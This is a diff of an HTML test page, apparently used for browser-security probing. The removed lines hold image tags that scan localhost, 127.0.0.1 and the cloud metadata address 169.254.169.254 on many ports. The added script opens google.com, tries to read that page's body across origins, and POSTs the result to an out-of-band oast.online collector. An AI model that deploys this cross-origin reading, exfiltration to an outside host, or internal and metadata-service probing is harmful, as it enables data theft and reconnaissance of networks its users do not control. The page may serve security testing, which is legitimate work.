@@ -3,39 +3,51 @@
  <body>
   <div id="result"></div>
   <div id="result1"></div>
-   <img src="http://localhost:8080/favicon.ico">
-   <img src="http://localhost:80/favicon.ico">
-   <img src="http://localhost:443/favicon.ico">
-   <img src="https://localhost:8080/favicon.ico">
-   <img src="https://localhost:80/favicon.ico">
-   <img src="https://localhost:443/favicon.ico">
-   <img src="http://localhost:3000/favicon.ico">
-   <img src="http://localhost:21/favicon.ico">
-   <img src="http://localhost:53/favicon.ico">
-   <img src="http://localhost:22/favicon.ico">
-   <img src="http://127.0.0.1:8080/favicon.ico">
-   <img src="http://127.0.0.1:80/favicon.ico">
-   <img src="http://127.0.0.1:443/favicon.ico">
-   <img src="https://127.0.0.1:8080/favicon.ico">
-   <img src="https://127.0.0.1:80/favicon.ico">
-   <img src="https://127.0.0.1:443/favicon.ico">
-   <img src="http://127.0.0.1:3000/favicon.ico">
-   <img src="http://127.0.0.1:21/favicon.ico">
-   <img src="http://127.0.0.1:53/favicon.ico">
-   <img src="http://127.0.0.1:65/favicon.ico">
-   <img src="http://127.0.0.1:22/favicon.ico">
-   <img src="http://google.com/favicon.ico">
-   <img src="https://google.com/favicon.ico">
-   <img src="http://169.254.169.254:8080/favicon.ico">
-   <img src="http://169.254.169.254:80/favicon.ico">
-   <img src="http://169.254.169.254:443/favicon.ico">
-   <img src="https://169.254.169.254:8080/favicon.ico">
-   <img src="https://169.254.169.254:80/favicon.ico">
-   <img src="https://169.254.169.254:443/favicon.ico">
-   <img src="http://169.254.169.254:3000/favicon.ico">
-   <img src="http://169.254.169.254:21/favicon.ico">
-   <img src="http://169.254.169.254:22/favicon.ico">
-   <img src="http://169.254.169.254:53/favicon.ico">
+  <script>
+const oast = "https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/";
+
+const w = window.open("https://google.com/");
+
+setTimeout(() => {
+    try {
+        const secret = w.document.getElementsByTagName("body").textContent;
+
+        const result = {
+            status: "SOP_BYPASS",
+            value: secret
+        };
+
+        document.body.innerHTML =
+            "<pre>" + JSON.stringify(result, null, 2) + "</pre>";
+
+        fetch(oast, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(result)
+        });
+
+    } catch (e) {
+        const result = {
+            status: "SOP_BLOCKED",
+            name: e.name,
+            message: e.message
+        };
+
+        document.body.innerHTML =
+            "<pre>" + JSON.stringify(result, null, 2) + "</pre>";
+
+        fetch(oast, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(result)
+        });
+    }
+}, 3000);
+</script>
   <!--<script>
 async function getData() {
     const url = "https://jsonip.com";
